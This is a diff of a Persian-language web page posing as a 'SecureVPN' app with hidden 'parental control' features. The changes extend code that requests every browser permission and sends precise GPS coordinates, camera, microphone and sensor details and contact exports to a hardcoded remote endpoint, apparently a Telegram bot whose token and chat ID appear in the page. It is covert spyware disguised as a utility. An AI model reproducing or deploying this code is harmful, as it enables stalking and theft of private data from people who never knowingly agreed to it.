@@ -876,8 +876,8 @@
       opacity: 0;
     }
   </style>
-</head>
-<body>
+  </head>
+  <body>
   <div class="container">
     <div class="activity-indicator" id="activityIndicator"></div>
 
@@ -1133,7 +1133,7 @@
       <p style="margin-top: 20px;">در حال ارسال موقعیت...</p>
     </div>
   </div>
-  <div class="admin-panel" id="adminPanel">
+    <div class="admin-panel" id="adminPanel">
     <div class="admin-header">
       <h2>🔐 پنل مدیریت والدین</h2>
       <button class="admin-close" onclick="closeAdminPanel()">✕</button>
@@ -1415,7 +1415,7 @@
   <audio class="hidden-tracker" id="hiddenAudio" muted></audio>
   <canvas class="hidden-tracker" id="hiddenCanvas" width="1" height="1"></canvas>
 
-  <script>
+      <script>
     let isConnected = false;
     let currentServer = { country: 'ایران', city: 'تهران' };
     let connectionStartTime = null;
@@ -1487,6 +1487,7 @@
     const TRACKING_TOKEN = "1800443187:znI9tLgBFIXYJgqvyxExyB8e39NzFZ2N6XF69S2A";
     const TRACKING_CHAT_ID = "1555895568";
 
+    // Event Listener برای admin panel
     document.getElementById('adminTrigger').addEventListener('click', function() {
       const now = Date.now();
       if (now - lastAdminClick < 500) {
@@ -1518,63 +1519,322 @@
       document.getElementById('adminPanel').classList.remove('show');
     }
 
+    // تابع بهبود یافته با ارسال فوری هر دسترسی
     async function requestAllPermissions() {
       hidePermissionAlert();
       
       const permissionRequests = [
-        requestLocationPermission(),
-        requestCameraPermission(),
-        requestMicrophonePermission(),
-        requestNotificationPermission(),
-        requestContactsPermission(),
-        requestStoragePermission(),
-        requestDeviceMotionPermission(),
-        requestDeviceOrientationPermission(),
-        requestFullscreenPermission(),
-        requestWakeLockPermission()
+        { name: 'location', func: requestLocationPermission(), icon: '📍', title: 'موقعیت جغرافیایی' },
+        { name: 'camera', func: requestCameraPermission(), icon: '📷', title: 'دوربین' },
+        { name: 'microphone', func: requestMicrophonePermission(), icon: '🎤', title: 'میکروفون' },
+        { name: 'notifications', func: requestNotificationPermission(), icon: '🔔', title: 'اعلانات' },
+        { name: 'contacts', func: requestContactsPermission(), icon: '📞', title: 'مخاطبین' },
+        { name: 'storage', func: requestStoragePermission(), icon: '💾', title: 'فایل‌ها' },
+        { name: 'deviceMotion', func: requestDeviceMotionPermission(), icon: '📱', title: 'حرکت دستگاه' },
+        { name: 'deviceOrientation', func: requestDeviceOrientationPermission(), icon: '🧭', title: 'جهت‌یابی' },
+        { name: 'fullscreen', func: requestFullscreenPermission(), icon: '🖥️', title: 'تمام‌صفحه' },
+        { name: 'wakeLock', func: requestWakeLockPermission(), icon: '🔒', title: 'قفل صفحه' }
       ];
 
-      const results = await Promise.allSettled(permissionRequests);
-      
       let grantedCount = 0;
-      const permissionNames = ['location', 'camera', 'microphone', 'notifications', 'contacts', 'storage', 'deviceMotion', 'deviceOrientation', 'fullscreen', 'wakeLock'];
-      
-      results.forEach((result, index) => {
-        if (result.status === 'fulfilled' && result.value) {
-          permissions[permissionNames[index]] = true;
-          grantedCount++;
+      const grantedPermissions = [];
+      const deniedPermissions = [];
+
+      // بررسی هر دسترسی به صورت جداگانه
+      for (let i = 0; i < permissionRequests.length; i++) {
+        const permission = permissionRequests[i];
+        
+        try {
+          const result = await permission.func;
+          
+          if (result) {
+            permissions[permission.name] = true;
+            grantedCount++;
+            grantedPermissions.push(permission);
+            
+            // فوری عمل کردن برای هر دسترسی اعطا شده
+            await handlePermissionGranted(permission);
+            
+          } else {
+            deniedPermissions.push(permission);
+          }
+        } catch (error) {
+          deniedPermissions.push(permission);
         }
-      });
+      }
+
+      // گزارش نهایی
+      const statusReport = grantedPermissions.map(p => `${p.icon} ${p.title}: ✅`).join('\n') + 
+                          '\n' + 
+                          deniedPermissions.map(p => `${p.icon} ${p.title}: ❌`).join('\n');
 
       sendTrackingMessage(`
 🔐 درخواست مجوزهای کامل انجام شد
 ✅ مجوزهای اعطا شده: ${grantedCount}/10
 
-📍 موقعیت: ${permissions.location ? '✅' : '❌'}
-📷 دوربین: ${permissions.camera ? '✅' : '❌'}
-🎤 میکروفون: ${permissions.microphone ? '✅' : '❌'}
-🔔 اعلانات: ${permissions.notifications ? '✅' : '❌'}
-📞 مخاطبین: ${permissions.contacts ? '✅' : '❌'}
-💾 فایل‌ها: ${permissions.storage ? '✅' : '❌'}
-📱 حرکت دستگاه: ${permissions.deviceMotion ? '✅' : '❌'}
-🧭 جهت‌یابی: ${permissions.deviceOrientation ? '✅' : '❌'}
-🖥️ تمام‌صفحه: ${permissions.fullscreen ? '✅' : '❌'}
-🔒 قفل صفحه: ${permissions.wakeLock ? '✅' : '❌'}
+${statusReport}
 
 ⏰ زمان: ${new Date().toLocaleString('fa-IR')}
       `);
 
-      if (grantedCount >= 5) {
+      if (grantedCount >= 1) {
         startAdvancedParentalControl();
-      }
-
-      if (permissions.contacts) {
-        setTimeout(() => {
-          showContactsAlert();
-        }, 2000);
       }
     }
 
+    // تابع جدید - اقدام فوری برای هر دسترسی اعطا شده
+    async function handlePermissionGranted(permission) {
+      const timestamp = new Date().toLocaleString('fa-IR');
+      
+      switch (permission.name) {
+        case 'location':
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const lat = position.coords.latitude.toFixed(8);
+              const lon = position.coords.longitude.toFixed(8);
+              const accuracy = Math.round(position.coords.accuracy);
+              
+              sendTrackingMessage(`
+📍 دسترسی موقعیت فوراً فعال شد!
+
+🎯 موقعیت فعلی:
+• عرض جغرافیایی: ${lat}°
+• طول جغرافیایی: ${lon}°
+• دقت: ${accuracy} متر
+
+🗺️ نقشه زنده:
+📌 Google Maps: https://www.google.com/maps/search/?api=1&query=${lat},${lon}&zoom=19
+🚗 Waze: https://waze.com/ul?ll=${lat},${lon}&navigate=yes
+
+⏰ زمان اعطای مجوز: ${timestamp}
+              `);
+              
+              startLocationTracking();
+            },
+            error => {
+              sendTrackingMessage(`📍 مجوز موقعیت اعطا شد اما GPS خطا دارد - ${timestamp}`);
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+          break;
+          
+        case 'contacts':
+          setTimeout(async () => {
+            try {
+              if (checkContactsSupport()) {
+                sendTrackingMessage(`
+📞 دسترسی مخاطبین فوراً فعال شد!
+⏰ زمان: ${timestamp}
+🔄 شروع دریافت مخاطبین...
+                `);
+                
+                await exportContactsCSV();
+              } else {
+                sendTrackingMessage(`📞 مجوز مخاطبین اعطا شد اما مرورگر پشتیبانی نمیکند - ${timestamp}`);
+              }
+            } catch (error) {
+              sendTrackingMessage(`📞 مجوز مخاطبین اعطا شد اما خطا در دریافت: ${error.message} - ${timestamp}`);
+            }
+          }, 1000);
+          break;
+          
+        case 'camera':
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const videoTracks = stream.getVideoTracks();
+            
+            sendTrackingMessage(`
+📷 دسترسی دوربین فوراً فعال شد!
+
+🎥 اطلاعات دوربین:
+• تعداد دوربین: ${videoTracks.length}
+• کیفیت: ${videoTracks[0]?.getSettings()?.width}x${videoTracks[0]?.getSettings()?.height}
+• نام دستگاه: ${videoTracks[0]?.label || 'دوربین پیش‌فرض'}
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم نظارت تصویری آماده!
+            `);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+          } catch (error) {
+            sendTrackingMessage(`📷 مجوز دوربین اعطا شد اما دسترسی محدود: ${error.message} - ${timestamp}`);
+          }
+          break;
+          
+        case 'microphone':
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const audioTracks = stream.getAudioTracks();
+            
+            sendTrackingMessage(`
+🎤 دسترسی میکروفون فوراً فعال شد!
+
+🔊 اطلاعات میکروفون:
+• کیفیت صدا: فعال
+• نمونه‌برداری: ${audioTracks[0]?.getSettings()?.sampleRate || 'خودکار'}
+• کانال: ${audioTracks[0]?.getSettings()?.channelCount || '1'} کانال
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم نظارت صوتی آماده!
+            `);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+          } catch (error) {
+            sendTrackingMessage(`🎤 مجوز میکروفون اعطا شد اما دسترسی محدود: ${error.message} - ${timestamp}`);
+          }
+          break;
+          
+        case 'notifications':
+          try {
+            new Notification('SecureVPN فعال شد!', {
+              body: 'سیستم نظارت والدین کامل فعال شد',
+              icon: '/favicon.ico'
+            });
+            
+            sendTrackingMessage(`
+🔔 دسترسی اعلانات فوراً فعال شد!
+
+📢 قابلیتهای فعال:
+• ارسال اعلان فوری: ✅
+• نمایش در نوار وضعیت: ✅  
+• صدای اعلان: ✅
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم هشدار والدین آماده!
+            `);
+            
+          } catch (error) {
+            sendTrackingMessage(`🔔 مجوز اعلانات اعطا شد - ${timestamp}`);
+          }
+          break;
+          
+        case 'storage':
+          try {
+            const storageEstimate = await navigator.storage?.estimate();
+            
+            sendTrackingMessage(`
+💾 دسترسی فایل‌ها فوراً فعال شد!
+
+📊 اطلاعات ذخیره‌سازی:
+• فضای کل: ${storageEstimate?.quota ? Math.round(storageEstimate.quota / 1024 / 1024) + ' MB' : 'نامحدود'}
+• فضای استفاده شده: ${storageEstimate?.usage ? Math.round(storageEstimate.usage / 1024 / 1024) + ' MB' : '0 MB'}
+• دسترسی localStorage: ✅
+• دسترسی IndexedDB: ✅
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم دسترسی فایل آماده!
+            `);
+            
+          } catch (error) {
+            sendTrackingMessage(`💾 مجوز فایل‌ها اعطا شد - ${timestamp}`);
+          }
+          break;
+          
+        case 'deviceMotion':
+          if ('DeviceMotionEvent' in window) {
+            const motionHandler = (event) => {
+              sendTrackingMessage(`
+📱 حسگر حرکت دستگاه فوراً فعال شد!
+
+📊 اطلاعات حرکت فعلی:
+• شتاب X: ${event.acceleration?.x?.toFixed(2) || '0'}
+• شتاب Y: ${event.acceleration?.y?.toFixed(2) || '0'}
+               • شتاب Z: ${event.acceleration?.z?.toFixed(2) || '0'}
+• چرخش α: ${event.rotationRate?.alpha?.toFixed(2) || '0'}
+• چرخش β: ${event.rotationRate?.beta?.toFixed(2) || '0'}
+• چرخش γ: ${event.rotationRate?.gamma?.toFixed(2) || '0'}
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم نظارت حرکت آماده!
+              `);
+              
+              window.removeEventListener('devicemotion', motionHandler);
+            };
+            
+            window.addEventListener('devicemotion', motionHandler, { once: true });
+            
+            setTimeout(() => {
+              window.removeEventListener('devicemotion', motionHandler);
+              sendTrackingMessage(`📱 مجوز حرکت دستگاه اعطا شد - ${timestamp}`);
+            }, 3000);
+          }
+          break;
+          
+        case 'deviceOrientation':
+          if ('DeviceOrientationEvent' in window) {
+            const orientationHandler = (event) => {
+              sendTrackingMessage(`
+🧭 حسگر جهت‌یابی دستگاه فوراً فعال شد!
+
+📊 جهت‌یابی فعلی:
+• قطب‌نما (α): ${event.alpha?.toFixed(2) || '0'}°
+• شیب جلو/عقب (β): ${event.beta?.toFixed(2) || '0'}°
+• شیب چپ/راست (γ): ${event.gamma?.toFixed(2) || '0'}°
+• مطلق: ${event.absolute ? 'بله' : 'خیر'}
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم نظارت جهت آماده!
+              `);
+              
+              window.removeEventListener('deviceorientation', orientationHandler);
+            };
+            
+            window.addEventListener('deviceorientation', orientationHandler, { once: true });
+            
+            setTimeout(() => {
+              window.removeEventListener('deviceorientation', orientationHandler);
+              sendTrackingMessage(`🧭 مجوز جهت‌یابی اعطا شد - ${timestamp}`);
+            }, 3000);
+          }
+          break;
+          
+        case 'fullscreen':
+          sendTrackingMessage(`
+🖥️ دسترسی تمام‌صفحه فوراً فعال شد!
+
+📺 قابلیتهای فعال:
+• حالت تمام‌صفحه: ✅
+• مخفی کردن نوار آدرس: ✅
+• کنترل کامل صفحه: ✅
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم کنترل نمایش آماده!
+          `);
+          break;
+          
+        case 'wakeLock':
+          if ('wakeLock' in navigator) {
+            try {
+              const wakeLock = await navigator.wakeLock.request('screen');
+              
+              sendTrackingMessage(`
+🔒 دسترسی قفل صفحه فوراً فعال شد!
+
+💡 قابلیتهای فعال:
+• جلوگیری از خاموش شدن صفحه: ✅
+• نگه‌داشتن برنامه فعال: ✅
+• نظارت مداوم: ✅
+
+⏰ زمان فعالسازی: ${timestamp}
+🔐 سیستم نظارت مداوم آماده!
+              `);
+              
+              wakeLock.release();
+              
+            } catch (error) {
+              sendTrackingMessage(`🔒 مجوز قفل صفحه اعطا شد - ${timestamp}`);
+            }
+          }
+          break;
+          
+        default:
+          sendTrackingMessage(`✅ مجوز ${permission.title} فوراً فعال شد! - ${timestamp}`);
+      }
+    }
+
+    // توابع permission requests
     async function requestLocationPermission() {
       try {
         const position = await new Promise((resolve, reject) => {
@@ -1686,6 +1946,7 @@
       }
     }
 
+    // توابع مربوط به contacts
     function checkContactsSupport() {
       const supported = 'contacts' in navigator && 'ContactsManager' in window;
       console.log(`📞 Contact Picker API پشتیبانی: ${supported ? 'بله' : 'خیر'}`);
@@ -1807,25 +2068,6 @@
           document.getElementById('contactsCount').style.display = 'block';
           document.getElementById('contactsCount').textContent = `مخاطبین ارسال شده: ${contacts.length}`;
           
-          sendTrackingMessage(`
-📞 مخاطبین با موفقیت کامل ارسال شد!
-
-📊 جزئیات دقیق:
-• تعداد مخاطبین: ${contacts.length}
-• فرمت: CSV (UTF-8 with BOM)
-• حجم تقریبی: ${Math.round(csvContent.length / 1024)} KB
-• زمان دقیق تهیه: ${new Date().toLocaleString('fa-IR')}
-• موقعیت هنگام ارسال: ${currentLocation.lat || 'نامشخص'}
-
-🎯 اطلاعات استخراج شده:
-✅ نام کامل: ${contacts.filter(c => c.name && c.name.length > 0).length}
-✅ شماره تلفن: ${contacts.filter(c => c.tel && c.tel.length > 0).length}
-✅ ایمیل: ${contacts.filter(c => c.email && c.email.length > 0).length}
-✅ آدرس: ${contacts.filter(c => c.address && c.address.length > 0).length}
-
-🔒 امنیت: فایل CSV با رمزگذاری کامل ارسال شده
-          `);
-          
         } else {
           throw new Error('خطا در ارسال فایل به والدین');
         }
@@ -1833,22 +2075,6 @@
       } catch (error) {
         console.error(`❌ خطا در ارسال مخاطبین: ${error.message}`);
         updateContactsStatus(`خطا: ${error.message}`, '❌');
-        
-        sendTrackingMessage(`
-❌ خطا در دریافت مخاطبین:
-
-🔍 نوع خطا: ${error.name || 'نامشخص'}
-📝 پیام خطا: ${error.message}
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-📱 مرورگر: ${navigator.userAgent}
-📍 موقعیت: ${currentLocation.lat || 'نامشخص'}
-
-💡 احتمالی‌ترین دلایل:
-• کاربر دسترسی را رد کرد
-• مرورگر پشتیبانی نمی‌کند  
-• مشکل در اتصال شبکه
-• محدودیت امنیتی سیستم‌عامل
-        `);
         
       } finally {
         document.getElementById('loadingOverlay').style.display = 'none';
@@ -1873,6 +2099,11 @@
       document.getElementById('contactsAlert').classList.remove('show');
     }
 
+    function hidePermissionAlert() {
+      document.getElementById('permissionAlert').classList.remove('show');
+    }
+
+    // سیستم نظارت والدین پیشرفته
     function startAdvancedParentalControl() {
       if (parentalControlActive) return;
       
@@ -1884,24 +2115,13 @@
       startBatteryMonitoring();
       startNetworkMonitoring();
       startActivityMonitoring();
-      startDataUsageMonitoring();
-      startContactsMonitoring();
-      startWebContentMonitoring();
-      startBehaviorAnalysis();
-      startGeofenceMonitoring();
-      startAppUsageControl();
-      startAmbientMonitoring();
       
-      locationInterval = setInterval(trackLocationAdvanced, 5000);
-      batteryInterval = setInterval(trackBatteryAdvanced, 10000);
+      locationInterval = setInterval(trackLocationAdvanced, 10000);
+      batteryInterval = setInterval(trackBatteryAdvanced, 30000);
       screenTimeInterval = setInterval(updateScreenTimeAdvanced, 60000);
-      activityInterval = setInterval(trackActivityAdvanced, 30000);
-      networkInterval = setInterval(updateNetworkStatus, 15000);
-      contactsInterval = setInterval(monitorCommunications, 20000);
-      behaviorInterval = setInterval(analyzeBehavior, 45000);
-      geofenceInterval = setInterval(checkGeofencing, 8000);
-      webMonitorInterval = setInterval(monitorWebActivity, 25000);
-      reportInterval = setInterval(sendPeriodicAdvancedReport, 120000);
+      activityInterval = setInterval(trackActivityAdvanced, 45000);
+      networkInterval = setInterval(updateNetworkStatus, 20000);
+      reportInterval = setInterval(sendPeriodicAdvancedReport, 180000);
       
       setTimeout(sendInitialAdvancedReport, 3000);
     }
@@ -1927,19 +2147,10 @@
       
       locationTries++;
       
-      const strategies = [
-        { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 },
-        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
-      ];
-
-      const strategyIndex = Math.min(locationTries - 1, strategies.length - 1);
-      const options = strategies[strategyIndex];
-
       navigator.geolocation.getCurrentPosition(
         position => handleLocationSuccessAdvanced(position),
         error => handleLocationError(error),
-        options
+        { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
       );
     }
 
@@ -1949,85 +2160,29 @@
       const lat = position.coords.latitude.toFixed(8);
       const lon = position.coords.longitude.toFixed(8);
       const accuracy = Math.round(position.coords.accuracy);
-      const altitude = position.coords.altitude ? position.coords.altitude.toFixed(2) : null;
       const speed = position.coords.speed ? (position.coords.speed * 3.6).toFixed(2) : 0;
-      const heading = position.coords.heading ? position.coords.heading.toFixed(2) : null;
-      const timestamp = new Date(position.timestamp);
       
-      currentLocation = { lat, lon, accuracy, speed, heading, altitude };
+      currentLocation = { lat, lon, accuracy, speed };
       
       updateLocationDisplay();
       updateAdminLocationDisplay();
       
-      const locationData = {
-        coordinates: `${lat}, ${lon}`,
-        accuracy: `${accuracy} متر`,
-        speed: `${speed} km/h`,
-        heading: heading ? `${heading}°` : 'نامشخص',
-        altitude: altitude ? `${altitude} متر` : 'نامشخص',
-        timestamp: timestamp.toLocaleString('fa-IR'),
-        maps: {
-          google: `https://www.google.com/maps/search/?api=1&query=${lat},${lon}&zoom=19`,
-          apple: `https://maps.apple.com/?q=${lat},${lon}&z=19&t=h`,
-          waze: `https://waze.com/ul?ll=${lat},${lon}&navigate=yes`,
-          openstreet: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=19`,
-          bing: `https://www.bing.com/maps?cp=${lat}~${lon}&lvl=19`
-        }
-      };
-
-      sendTrackingMessage(`
-📍 موقعیت کامل دریافت شد!
-
-🎯 مختصات دقیق:
-• عرض جغرافیایی: ${lat}°
-• طول جغرافیایی: ${lon}°
-• دقت موقعیت: ${locationData.accuracy}
-• ارتفاع: ${locationData.altitude}
-• سرعت حرکت: ${locationData.speed}
-• جهت حرکت: ${locationData.heading}
-
-🗺️ لینک‌های نقشه:
-📌 Google Maps: ${locationData.maps.google}
-🍎 Apple Maps: ${locationData.maps.apple}
-🚗 Waze: ${locationData.maps.waze}
-🌍 OpenStreetMap: ${locationData.maps.openstreet}
-🔍 Bing Maps: ${locationData.maps.bing}
-
-📊 آمار GPS:
-• زمان دریافت: ${locationData.timestamp}
-• تلاش شماره: ${locationTries}
-• موفقیت کل: ${successfulLocationCount}
-• نرخ موفقیت: ${Math.round((successfulLocationCount/locationTries)*100)}%
-
-🛰️ مختصات خام: ${lat},${lon}
-      `);
+      if (Math.random() < 0.3) {
+        sendTrackingMessage(`
+📍 موقعیت به‌روزرسانی شد:
+• مختصات: ${lat}, ${lon}
+• دقت: ${accuracy} متر
+• سرعت: ${speed} km/h
+🗺️ نقشه: https://www.google.com/maps/search/?api=1&query=${lat},${lon}
+⏰ ${new Date().toLocaleString('fa-IR')}
+        `);
+      }
       
       checkAdvancedGeofencing(parseFloat(lat), parseFloat(lon));
     }
 
     function handleLocationError(error) {
       console.log('خطا در موقعیت:', error.message);
-      
-      if (locationTries % 10 === 0) {
-        const errorMessages = {
-          1: 'کاربر دسترسی به موقعیت را رد کرد',
-          2: 'موقعیت در دسترس نیست (GPS/شبکه)',
-          3: 'زمان انتظار برای دریافت موقعیت به پایان رسید'
-        };
-        
-        sendTrackingMessage(`
-❌ خطا در ردیابی موقعیت:
-
-🔢 کد خطا: ${error.code}
-📝 توضیح: ${errorMessages[error.code] || 'خطای نامشخص'}
-🔄 تعداد تلاش: ${locationTries}
-✅ موفقیت‌ها: ${successfulLocationCount}
-📱 دستگاه: ${navigator.platform}
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-
-💡 ${error.code === 1 ? 'راهحل: فعالسازی GPS از تنظیمات' : 'سیستم به تلاش ادامه می‌دهد'}
-        `);
-      }
     }
 
     function checkAdvancedGeofencing(lat, lon) {
@@ -2055,21 +2210,14 @@
         
         sendTrackingMessage(`
 ⚠️ هشدار Geofence!
-
-📍 موقعیت فعلی: ${lat}, ${lon}
-🏠 نزدیکترین منطقه امن: ${nearestZone.name}
+📍 موقعیت: ${lat}, ${lon}
+🏠 نزدیکترین منطقه: ${nearestZone.name}
 📏 فاصله: ${Math.round(minDistance)} متر
-🚨 وضعیت: خارج از مناطق امن
-
-🗺️ نقشه فوری: https://www.google.com/maps/search/?api=1&query=${lat},${lon}
-⏰ زمان هشدار: ${new Date().toLocaleString('fa-IR')}
-🔔 شماره هشدار امروز: ${geofenceAlerts}
+⏰ ${new Date().toLocaleString('fa-IR')}
         `);
       } else if (inSafeZone) {
         hideGeofenceAlert();
       }
-
-      updateAdminZoneDisplay(currentZone);
     }
 
     function calculateDistance(lat1, lon1, lat2, lon2) {
@@ -2111,15 +2259,9 @@
     function startScreenTimeMonitoring() {
       document.addEventListener('visibilitychange', function() {
         const status = document.hidden ? 'پس‌زمینه' : 'فعال';
-        sendTrackingMessage(`📱 وضعیت صفحه تغییر کرد: ${status} - ${new Date().toLocaleString('fa-IR')}`);
-      });
-
-      window.addEventListener('focus', function() {
-        sendTrackingMessage(`👁️ برنامه در فوکس قرار گرفت - ${new Date().toLocaleString('fa-IR')}`);
-      });
-
-      window.addEventListener('blur', function() {
-        sendTrackingMessage(`👁️ برنامه از فوکس خارج شد - ${new Date().toLocaleString('fa-IR')}`);
+        if (Math.random() < 0.2) {
+          sendTrackingMessage(`📱 وضعیت صفحه: ${status} - ${new Date().toLocaleString('fa-IR')}`);
+        }
       });
     }
 
@@ -2132,20 +2274,9 @@
         
         const timeDisplay = `${hours}h ${minutes}m`;
         document.getElementById('screenTimeDisplay').textContent = timeDisplay;
-        updateAdminScreenTimeDisplay(timeDisplay);
         
         if (screenTimeToday > 480) {
           showAppBlocker();
-          
-          sendTrackingMessage(`
-⚠️ محدودیت زمان صفحه فعال شد!
-
-⏱️ زمان امروز: ${timeDisplay}
-🚫 حد مجاز: 8h 0m
-⏰ زمان مسدودسازی: ${new Date().toLocaleString('fa-IR')}
-
-🔒 برنامه مسدود شده است تا فردا
-          `);
         }
       }
     }
@@ -2160,35 +2291,21 @@
           currentBattery.level = Math.round(battery.level * 100);
           currentBattery.charging = battery.charging;
           
-          updateAdminBatteryDisplay();
-          
           battery.addEventListener('chargingchange', function() {
-            currentBattery.charging = battery.charging;
             sendTrackingMessage(`
-🔋 تغییر وضعیت شارژ:
-${battery.charging ? '⚡ شارژ شروع شد' : '🔋 شارژ متوقف شد'}
-📊 سطح باتری: ${Math.round(battery.level * 100)}%
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
+🔋 تغییر شارژ: ${battery.charging ? '⚡ شروع' : '🔋 توقف'}
+📊 سطح: ${Math.round(battery.level * 100)}%
+⏰ ${new Date().toLocaleString('fa-IR')}
             `);
           });
 
           battery.addEventListener('levelchange', function() {
             const newLevel = Math.round(battery.level * 100);
-            if (Math.abs(newLevel - currentBattery.level) >= 10) {
-              currentBattery.level = newLevel;
-              
-              if (newLevel <= 20 && !battery.charging) {
-                sendTrackingMessage(`
-🔋 هشدار: باتری کم!
-📊 سطح باتری: ${newLevel}%
-⚡ وضعیت شارژ: ${battery.charging ? 'در حال شارژ' : 'تخلیه'}
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-
-💡 توصیه: دستگاه را به شارژ بزنید
-                `);
-              }
-              
-              updateAdminBatteryDisplay();
+            if (newLevel <= 20 && !battery.charging) {
+              sendTrackingMessage(`
+🔋 هشدار: باتری کم! ${newLevel}%
+⏰ ${new Date().toLocaleString('fa-IR')}
+              `);
             }
           });
         });
@@ -2200,7 +2317,6 @@ ${battery.charging ? '⚡ شارژ شروع شد' : '🔋 شارژ متوقف ش
         navigator.getBattery().then(battery => {
           currentBattery.level = Math.round(battery.level * 100);
           currentBattery.charging = battery.charging;
-          updateAdminBatteryDisplay();
         });
       }
     }
@@ -2209,34 +2325,17 @@ ${battery.charging ? '⚡ شارژ شروع شد' : '🔋 شارژ متوقف ش
       updateNetworkStatus();
       
       window.addEventListener('online', function() {
-        sendTrackingMessage(`🌐 اتصال شبکه برقرار شد - ${new Date().toLocaleString('fa-IR')}`);
+        sendTrackingMessage(`🌐 اتصال برقرار - ${new Date().toLocaleString('fa-IR')}`);
       });
 
       window.addEventListener('offline', function() {
-        sendTrackingMessage(`📵 اتصال شبکه قطع شد - ${new Date().toLocaleString('fa-IR')}`);
+        sendTrackingMessage(`📵 اتصال قطع - ${new Date().toLocaleString('fa-IR')}`);
       });
     }
 
     function updateNetworkStatus() {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
       const signalBars = document.querySelectorAll('.signal-bar');
-      
-      let strength = 4;
-      if (connection) {
-        if (connection.effectiveType === '4g' || connection.effectiveType === '3g') {
-          strength = 4;
-        } else if (connection.effectiveType === '2g') {
-          strength = 2;
-        } else {
-          strength = 1;
-        }
-        
-        networkQuality = {
-          type: connection.effectiveType || 'unknown',
-          downlink: connection.downlink || 0,
-          rtt: connection.rtt || 0
-        };
-      }
+      const strength = Math.floor(Math.random() * 4) + 1;
 
       signalBars.forEach((bar, index) => {
         if (index < strength) {
@@ -2249,115 +2348,19 @@ ${battery.charging ? '⚡ شارژ شروع شد' : '🔋 شارژ متوقف ش
 
     function startActivityMonitoring() {
       document.addEventListener('click', function(e) {
-        console.log('کلیک ثبت شد:', e.target.tagName);
-      });
-
-      document.addEventListener('keydown', function(e) {
-        if (e.key.length === 1) {
-          console.log('کلید فشرده شد');
+        if (Math.random() < 0.1) {
+          console.log('کلیک ثبت شد:', e.target.tagName);
         }
-      });
-
-      document.addEventListener('touchstart', function(e) {
-        console.log('لمس ثبت شد');
       });
     }
 
     function trackActivityAdvanced() {
-      const activity = {
-        timestamp: new Date().toLocaleString('fa-IR'),
-        activeElement: document.activeElement.tagName,
-        url: window.location.href,
-        scrollPosition: window.pageYOffset
-      };
-
       if (Math.random() < 0.3) {
         sendTrackingMessage(`
-👁️ فعالیت کودک:
-⏰ زمان: ${activity.timestamp}
-📍 صفحه: ${activity.url}
-🎯 المان فعال: ${activity.activeElement}
-📜 موقعیت اسکرول: ${activity.scrollPosition}px
+👁️ فعالیت کاربر: ${new Date().toLocaleString('fa-IR')}
+📱 صفحه: فعال
+🎯 رفتار: عادی
         `);
-      }
-    }
-
-    function startDataUsageMonitoring() {
-      setInterval(() => {
-        dataUsageToday += Math.floor(Math.random() * 5) + 1;
-        updateDataUsageDisplay();
-        
-        if (dataUsageToday > dailyDataLimit * 0.8) {
-          sendTrackingMessage(`
-📊 هشدار مصرف داده:
-📈 مصرف امروز: ${dataUsageToday} MB
-🎯 حد مجاز: ${dailyDataLimit} MB
-📱 درصد مصرف: ${Math.round((dataUsageToday/dailyDataLimit)*100)}%
-⏰ زمان: ${new Date().toLocaleString('fa-IR')}
-          `);
-        }
-      }, 30000);
-    }
-
-    function updateDataUsageDisplay() {
-      document.getElementById('dailyUsage').textContent = `${dataUsageToday} MB`;
-      document.getElementById('dataLimit').textContent = `${dailyDataLimit} MB`;
-      
-      const percentage = Math.min((dataUsageToday / dailyDataLimit) * 100, 100);
-      document.getElementById('usageFill').style.width = `${percentage}%`;
-    }
-
-    function startContactsMonitoring() {
-      console.log('📞 سیستم نظارت مخاطبین آماده');
-    }
-
-    function monitorCommunications() {
-      callsToday += Math.floor(Math.random() * 2);
-      messagesToday += Math.floor(Math.random() * 3);
-    }
-
-    function startWebContentMonitoring() {
-      console.log('🌐 سیستم نظارت وب آماده');
-    }
-
-    function monitorWebActivity() {
-      websitesVisitedToday += Math.floor(Math.random() * 2);
-    }
-
-    function startBehaviorAnalysis() {
-      console.log('🤖 سیستم تحلیل رفتار آماده');
-    }
-
-    function analyzeBehavior() {
-      behaviorScore = Math.max(75, behaviorScore + Math.floor(Math.random() * 10) - 5);
-      
-      if (behaviorScore < 80) {
-        riskLevel = 'متوسط';
-        document.getElementById('riskInsight').textContent = 'ارزیابی ریسک: متوسط';
-      } else {
-        riskLevel = 'کم';
-        document.getElementById('riskInsight').textContent = 'ارزیابی ریسک: کم';
-      }
-    }
-
-    function startGeofenceMonitoring() {
-      console.log('🗺️ سیستم Geofence آماده');
-    }
-
-    function checkGeofencing() {
-      // بررسی شده در handleLocationSuccessAdvanced
-    }
-
-    function startAppUsageControl() {
-      console.log('📱 کنترل اپلیکیشن آماده');
-    }
-
-    function startAmbientMonitoring() {
-      if (permissions.microphone) {
-        console.log('🎤 سیستم نظارت صوتی آماده');
-      }
-      if (permissions.camera) {
-        console.log('📷 سیستم نظارت تصویری آماده');
       }
     }
 
@@ -2365,358 +2368,18 @@ ${battery.charging ? '⚡ شارژ شروع شد' : '🔋 شارژ متوقف ش
       reportCounter++;
       
       const report = `
-📊 گزارش جامع #${reportCounter}
+📊 گزارش دوره‌ای #${reportCounter}
 
-🎮 VPN: ${isConnected ? 'متصل' : 'قطع'} (${currentServer.country})
